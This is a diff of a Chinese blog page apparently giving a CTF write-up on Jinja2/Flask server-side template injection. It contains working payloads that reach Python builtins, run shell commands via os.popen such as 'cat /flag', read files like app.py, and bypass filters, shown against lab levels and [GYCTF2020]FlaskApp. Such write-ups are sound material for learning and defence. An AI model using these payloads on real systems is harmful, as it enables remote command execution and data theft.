@@ -487,7 +487,7 @@ ssti概述贴个大佬的文章
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-13
+                    2022-03-28
                 </div>
                 
 
@@ -583,13 +583,18 @@ request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用
 <p>我们可以利用的方法有&lt;type &#39;file&#39;&gt;等，（一般file在第40号）</p>
 <p><strong>找到重载过的<code>__init__</code>类</strong></p>
 <pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__
-	&lt;unbound method WarningMessage.__init__</code></pre>
+	&lt;unbound method WarningMessage.__init__
+    
+    &#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings)
+可以查看当前位置，</code></pre>
 
 <p> <strong>查看其引用<code>__builtins__</code></strong></p>
 <pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;]</code></pre>
 
-<p><strong>使用os模块执行命令来读取flag</strong></p>
+<p><strong>使用os模块执行命令来读取flag或者执行命令</strong></p>
 <pre class="language-python" data-language="python"><code class="language-python">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)
+
+&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125;
 </code></pre>
 
 <p><strong>来、姿势</strong></p>
@@ -681,27 +686,27 @@ _&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre>
 &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125;</code></pre>
 
 <h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>搭了个靶场</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png" alt="image-20210627213543193"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213543193.png" alt="image-20210627213543193"></p>
 <h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>先找基本类</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213659700.png" alt="image-20210627213659700"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213659700.png" alt="image-20210627213659700"></p>
 <p>再获取基本类的子类</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213839196.png" alt="image-20210627213839196"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627213839196.png" alt="image-20210627213839196"></p>
 <p>找到重载过的<code>__init__</code>类</p>
 <pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125;</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214555384.png" alt="image-20210627214555384"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214555384.png" alt="image-20210627214555384"></p>
 <p>查看其引用<code>__builtins__</code></p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214844624.png" alt="image-20210627214844624"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627214844624.png" alt="image-20210627214844624"></p>
 <p>利用eval命令执行来读取flag</p>
 <pre class="language-python" data-language="python"><code class="language-python">&#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125;</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627215059572.png" alt="image-20210627215059572"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627215059572.png" alt="image-20210627215059572"></p>
 <h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>这个过滤了{ { ，所以要采用{ % % }的形式</p>
 <p>{ % % }内加控制语句</p>
 <p>且这里展示数据要利用{ % print % }</p>
 <pre class="language-python" data-language="python"><code class="language-python">&#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125;</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627232829026.png" alt="image-20210627232829026"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210627232829026.png" alt="image-20210627232829026"></p>
 <p>还有一种是利用控制语句</p>
 <p>寻找符合条件的子类再利用WarningMessage的<code>__bulitins__</code>执行代码这个还不太懂先贴一下payload</p>
 <pre class="language-python" data-language="python"><code class="language-python">&#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if  sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</code></pre>
@@ -735,20 +740,20 @@ _&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre>
 
 <h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>在学了在学了（</p>
 <h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>题目里有base64加密、解密和一个提示页面，试一下就可以知道解密框存在ssti注入，且当报错时会进入debug模式在这里可以看到一部分源码</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629011031131.png" alt="image-20210629011031131"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629011031131.png" alt="image-20210629011031131"></p>
 <p>试着访问app。py</p>
 <pre class="language-python" data-language="python"><code class="language-python">&#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002905912.png" alt="image-20210629002905912"></p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002847559.png" alt="image-20210629002847559"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002905912.png" alt="image-20210629002905912"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629002847559.png" alt="image-20210629002847559"></p>
 <p>这里可以看到过滤了一些内容</p>
 <p>再查找目录内内容</p>
 <pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
 
 <p>os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003200355.png" alt="image-20210629003200355"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003200355.png" alt="image-20210629003200355"></p>
 <p>看见一个this_is_the_flag.txt</p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003236918.png" alt="image-20210629003236918"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629003236918.png" alt="image-20210629003236918"></p>
 <p>尝试去访问,得到flag</p>
 <pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;
 &#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
@@ -756,8 +761,8 @@ _&#96;是&#96;\x5f&#96;，&#96;.&#96;是&#96;\x2E</code></pre>
 <p>也可以利用切片的方式</p>
 <pre class="language-python" data-language="python"><code class="language-python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre>
 
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629010815862.png" alt="image-20210629010815862"></p>
-<p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210825113642464.png" alt="image-20210825113642464"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210629010815862.png" alt="image-20210629010815862"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20210825113642464.png" alt="image-20210825113642464"></p>
 
                 
             </div>
@@ -1556,7 +1561,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">77.3k</span>
+                        class="white-color">81k</span>
             
             
             
